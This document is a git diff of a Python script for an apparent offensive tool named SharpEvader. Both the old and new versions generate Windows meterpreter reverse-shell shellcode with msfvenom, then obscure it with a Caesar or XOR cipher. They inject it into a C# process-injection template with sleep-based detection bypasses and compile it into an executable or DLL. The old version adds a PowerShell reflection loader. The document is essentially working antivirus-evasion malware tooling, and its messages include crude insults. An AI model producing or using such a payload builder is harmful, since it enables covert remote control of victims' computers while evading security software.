@@ -1,169 +1,90 @@
 import os
+import logging
 import subprocess
+import yaml
 
-bold = "\033[1m"
-green = "\033[32m"
-white = "\033[37m"
-purple = "\033[95m"
-red = "\033[91m"
-blue = "\033[34m"
-orange = "\033[33m"
-end = "\033[0m"
+from helpers.args import generate_cli_args
+from helpers.generate_csharp_payload import generate_csharp_payload
 
-def print_success(text) :
-    print(f"{bold}{green}[+] {end}{text}")
-def print_info(text) :
-    print(f"{bold}{purple}[*] {end}{text}")
-def print_error(text) : 
-    print(f"{bold}{red}[-] {end}{text}")
-def banner():
-	print(f"""{bold}{blue}
- ____  _                      _____                _           
-/ ___|| |__   __ _ _ __ _ __ | ____|_   ____ _  __| | ___ _ __ 
-{green}\___ \| '_ \ / _` | '__| '_ \|  _| \ \ / / _` |/ _` |/ _ \ '__|
-{orange} ___) | | | | (_| | |  | |_) | |___ \ V / (_| | (_| |  __/ |   
-{purple}|____/|_| |_|\__,_|_|  | .__/|_____| \_/ \__,_|\__,_|\___|_|   
-{green}                       |_|                                     
-	""")
+# Shellcode Scramblers
+from shellcode_scrambler.xor_encryptor import xor_encryptor
+
+# Generate the msfvenom shellcode and put it in the /tmp/sharpevader_tmp/msf_shellcode.hex
+def generate_msfvenom_payload():
+    # Checking the availability of the /tmp/sharpevader_tmp/ directory and if not available then give birth to it
+    if not os.path.isdir("/tmp/sharpevader_tmp"):
+        logging.debug(f"The /tmp/sharpevader_tcp/ is not present, creating the directory")
+        subprocess.run("mkdir /tmp/sharpevader_tmp".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    
+    # Generating the msfvenom payload in the /tmp/tmp_sharpevader/ directory in hex format
+    subprocess.run(f"msfvenom -p {args.p} LHOST={args.lh} LPORT={args.lp} -f hex -o /tmp/sharpevader_tmp/msf_shellcode.hex".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 
 
-banner()
-LHOST = input(f"{orange}{bold}LHOST:{white} ")
-LPORT = input(f"{orange}{bold}LPORT:{white} ")
-PAYLOAD = input(f"{orange}{bold}PAYLOAD PROTO({green}{bold}tcp{orange}/{green}{bold}https{orange}):{white} ")
-PAYLOAD_TYPE = input(f"{orange}{bold}PAYLOAD TYPE({green}{bold}exe[{red}Default{green}]{orange}/{green}{bold}dll{orange}):{white} ")
-msfvenom = "windows/x64/meterpreter/reverse_"
+# This would read the /tmp/sharpevader_tmp/msf_shellcode.hex shellcode and convert it into an integer shellcode
+def read_and_convert_shellcode():
+    with open("/tmp/sharpevader_tmp/msf_shellcode.hex","r") as msf_hex_shellcode:
+        hex_shellcode = msf_hex_shellcode.read()
+    integer_shellcode = [int(hex_shellcode[i:i+2],16) for i in range(0, len(hex_shellcode), 2)]
+    
+    return integer_shellcode
 
-# Checking the availability of the output directory and if not available then give birth to it
-if not os.path.isdir("output"):
-	print_info(f"First Time use detected, Generating required Directories...")
-	subprocess.run(["mkdir","output"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+# Compiling the csharp code and placing it in the current working directory
+def compile_csharp_code():
+    cwd = os.getcwd()
+    subprocess.run(f"mcs -out:{cwd}/rev.exe /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 
-# Checking if some one is a**hole enough to enter a payload other than tcp or https, and if they do slap them
-if PAYLOAD.lower() not in ["tcp","https"]:
-	print_error(f"{PAYLOAD} is an invalid payload {red}{bold}dipshit{end}. Either use {bold}{green}https{end} or {bold}{green}tcp{end}")
-	exit()
-
-# Empty payload_type means exe
-if PAYLOAD_TYPE.lower() == "":
-	PAYLOAD_TYPE = "exe"
-
-if PAYLOAD_TYPE.lower() not in ["exe","dll"]:
-	print_error(f"{PAYLOAD_TYPE} is an invalid payload type {red}{bold}dipshit{end}. Either use {bold}{green}exe{end} or {bold}{green}dll{end}")
-	exit()
-
-
-# If someone decides to enter the payload in capitals, or maybe when I type and my capslock is on accidentally
-PAYLOAD = PAYLOAD.lower()
-PAYLOAD_TYPE = PAYLOAD_TYPE.lower()
-
-print_info(f"Using LHOST as {orange}{bold}{LHOST}{end}, LPORT as {bold}{orange}{LPORT}{end} and PAYLOAD as {bold}{orange}{msfvenom}{PAYLOAD}")
-
-# Using msfvenom to generate shellcode for using windows/x64/meterpreter/reverse_https or reverse_tcp payload and LHOST and LPORT given as input from the user
-print_info("Generating msfvenom shellcode...")
-subprocess.run(["msfvenom","-p",f"windows/x64/meterpreter/reverse_{PAYLOAD}",f"LHOST={LHOST}",f"LPORT={LPORT}","-f","hex","-o","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-print_success("MSFVenom Shellcode generation successful")
-
-# Reading the hexstring shellcode from the msfvenom file and converting into an integer array
-with open("msf_shellcode.hex","r") as msf_hex_shellcode:
-	hex_shellcode = msf_hex_shellcode.read()
-
-integer_shellcode = [int(hex_shellcode[i:i+2],16) for i in range(0, len(hex_shellcode), 2)]
+# This is for cleaning up the temp directory created
+def cleanup():
+    # Checking if the /tmp/sharpevader_tcp exists, and if it does clear all files inside it
+    if os.path.isdir("/tmp/sharpevader_tmp"):
+        logging.debug("Starting cleanup process")
+        # This is a bit idiotic route as for the reason wildcards do not work with subprocess
+        dir_path = "/tmp/sharpevader_tmp/"
+        files = os.listdir(dir_path)
+        for file in files:
+            file_path = os.path.join(dir_path, file)
+            subprocess.run(["rm", "-f", file_path])
+    else:
+        logging.debug("Temporary directory /tmp/sharpevader_tmp/ missing, Exiting without cleanup...")
+    
 
 
-# Caeser Cipher Section which also has the caeser cipher key
-scrambled_shellcode = []
-caeser_key = 7
-for each in integer_shellcode:
-	scrambled_shellcode.append(hex((each + caeser_key) & 0xff))
+def main():
+    # Inserting the argparser arguments
+    global args
+    args = generate_cli_args()
 
-print_success(f"Encoded shellcode with caeser cipher with +{caeser_key} as Key")
+    # Generating the msfvenom payload and placing it in the /tmp/sharpevader_tmp/msf_shellcode.hex
+    generate_msfvenom_payload()
 
-# Packing the shellcode in the 0xff style array for usage in C#
-final_shellcode = ""
-for i in range(len(scrambled_shellcode)):
-	if i == 0:
-		final_shellcode += f"byte[] buf = new byte[{len(scrambled_shellcode)}]" + "{\n"
-	final_shellcode += scrambled_shellcode[i]
-	if i % 14 == 0 and i != 0:
-		final_shellcode += ",\n"
-	elif i == 0 or (i % 14 != 0 and i != len(scrambled_shellcode)-1):
-		final_shellcode += ","
-	if i == len(scrambled_shellcode)-1:
-		final_shellcode += " };"
-
-# Removing the shellcode as no one needs it anymore
-subprocess.run(["rm","-rf","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-print_info(f"Deleting the msf_shellcode.hex file as no one wants it anymore")
+    # [RAW Shellcode]Read the shellcode as an integer and return it into this array
+    integer_shellcode = read_and_convert_shellcode()
+    scrambled_shellcode, key, decryption_routine_cs = xor_encryptor(integer_shellcode)
 
 
-# Assembling a c# sln project with encoded shellcode in the output directory
-print_info(f"Baking the fresh Shellcode into a C# project for compiling")
-csharp_proj_name = f"{LHOST}_{LPORT}_{PAYLOAD}_{PAYLOAD_TYPE}"
+    # def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
+    script_path = os.path.dirname(os.path.abspath(__file__))
+    with open(f"{script_path}/payloads/injection_templates/injection_template_marker.yaml","r") as f:
+        injection_markers = yaml.load(f, Loader=yaml.SafeLoader)
+    with open(f"{script_path}/payloads/injection_templates/process_injection.cs","r") as f:
+        csharp_template = f.readlines()
+    with open(f"{script_path}/payloads/behaviour_bypass/main.yaml","r") as f:
+        behaviour_bypass = yaml.load(f, Loader=yaml.SafeLoader)
 
-if os.path.isdir(f"output/{csharp_proj_name}"):
-	print_info("Existing generated shellcode found, Overwriting it :P")
-	subprocess.run(["rm","-rf",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    # Generatinh the final csharp code with all the bypasses baked in
+    final_csharp_template = generate_csharp_payload(csharp_template,scrambled_shellcode,decryption_routine_cs,behaviour_bypass["behaviour_detection_bypass"]["sleep_calls"],injection_markers["injection_markers"]["process_injection.cs"])
 
-subprocess.run(["mkdir","-p",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    # Writing the file in the /tmp/sharpevader_tmp/magisk.cs
+    with open("/tmp/sharpevader_tmp/magisk.cs","w") as f:
+        final_csharp_code = "".join(final_csharp_template)
+        f.write(final_csharp_code)
+    
+    # Compiling the csharp code
+    compile_csharp_code()
 
-# Checking if the user is wanting a dll or a exe
-if PAYLOAD_TYPE == "exe":
-	subprocess.run(["cp","-r","templates/rev_exe",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-if PAYLOAD_TYPE == "dll":
-	subprocess.run(["cp","-r","templates/rev_dll",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    # Cleaning up the /tmp directory
+    cleanup()
 
-with open(f"output/{csharp_proj_name}/csharp/black_order.cs","r") as csharp_template_code:
-	template_code = csharp_template_code.readlines()
-
-# Injecting our shellcode in the C# template
-template_code.insert(30,final_shellcode)
-
-with open(f"output/{csharp_proj_name}/csharp/black_order.cs","w") as final_csharp_code:
-	template_code = "".join(template_code)
-	final_csharp_code.write(template_code)
-print_success(f"Your C# shellcode runner is baked successfully, and it smells nice !!!")
-
-# Checking the availability of mono-mcs
-try:
-	mcs_availability = subprocess.run(["mcs","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
-except FileNotFoundError:
-	mcs_availability = 1
-# Checking the availability of Powershell on Linux
-try:
-	pwsh_availability = subprocess.run(["pwsh","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
-except FileNotFoundError:
-	pwsh_availability = 1
-
-# This block is executed when mono-mcs is found so we try to compile the damn payload
-if mcs_availability == 0:
-	print_success("C# Compiler found, Time for some frosting on the cake ^_^")
-	# Starting the compilation of the payload using mono-mcs
-
-	# Compiling the source into an Windows executable
-	if PAYLOAD_TYPE == "exe":
-		subprocess.run(["mcs",f"-out:output/{csharp_proj_name}/rev.exe",f"output/{csharp_proj_name}/csharp/black_order.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-	
-	# Compiling the source into a Windows Library
-	if PAYLOAD_TYPE == "dll":
-		subprocess.run(["mcs","-target:library",f"-out:output/{csharp_proj_name}/rev.dll",f"output/{csharp_proj_name}/csharp/black_order.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-	print_success(f"Your cake has been frosted successfully and named output/{csharp_proj_name}/rev.{PAYLOAD_TYPE}")
-
-# No mono-mcs compiler found go and compiler found so go f*** yourself
-else:
-	print_error(f"Err!!! Could not compile the C# payload, possibly mcs is missing :(")
-
-# Generating reflection file using the exe or dll 
-if pwsh_availability == 0 and mcs_availability == 0:
-	print_success("Powershell Found, Let's Box up your frosted cake...")
-	subprocess.run(["pwsh","reflection_pwsh_gen.ps1","-File",f"output/{csharp_proj_name}/rev.{PAYLOAD_TYPE}"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-	subprocess.run(["mv","rev.ps1",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-	print_success(f"Boxed it up and named output/{csharp_proj_name}/rev.ps1")
-
-# Nothing available on your system maybe your are that child who is even hated by their own mother :P
-elif pwsh_availability == 0 and mcs_availability != 0:
-	print_error("Reflection cannot be generated if the code is not yet compiled !!!")
-	print_info("Please compile the code into an executable and then, attempt to generate an reflection with the ps1 script :)")
-
-
-print_success(f"{orange}{bold}Happy Evasion using {csharp_proj_name}!!!{end}")
+# The main function
+if __name__ == '__main__':
+    main()
